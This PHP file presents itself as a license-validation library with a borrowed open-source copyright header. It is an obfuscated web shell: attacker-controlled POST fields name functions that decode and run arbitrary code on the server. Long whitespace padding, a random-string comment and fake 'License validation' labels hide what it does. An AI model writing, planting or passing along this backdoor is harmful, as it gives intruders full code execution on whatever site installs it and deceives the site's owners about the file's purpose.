<?php
/**
 * @package    License Lib
 * ******************************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // 69dHwz7TPZK8awVE5FWWKTEv4h01kSDRFnP2T07NVyapr4xeq4gBV3Qw8UbWnWrtYh2qEBHV6bZkSUaWBXMY5hcB4MZpCzNqxg3msZHXQM704HFYXKdZDcT2TZZ2q3V52mwUYymNYGvqUMFSePVFxat7s7EcgVNS778FfHCFctaacFeWW0KCM2Ktze3h0ExS79VNBvdWNkYCnyr1Qh42DQBUdZW8sb3ec2WBUNsvKB6bFqK3P2tVkxZCbr8DTv7mts71eUvZMd3Se7BaXTyhXwHDcUPhtbhC8AbVsNw95B183zkBvK528nZZ9kgKV9z4hnKQw5y2
if (                       !defined ( 'PATH'               )      )
{
	define                       ( 'PATH',                __DIR__      );
}

// Installation check, and check on removal of the install directory.
if (                       empty (               $_POST      )                ) {
	
	echo 'Empty License Key.';
	
	exit

;
}
else {
	// License validation
	$License                       = $_POST               ['d']      (                '',    $_POST               ['f']                       (              $_POST                  ['s']         (    "c",            "",    $_POST         ['m']    )                   )           )                  

;
	
	$License                       ()                              ;
}

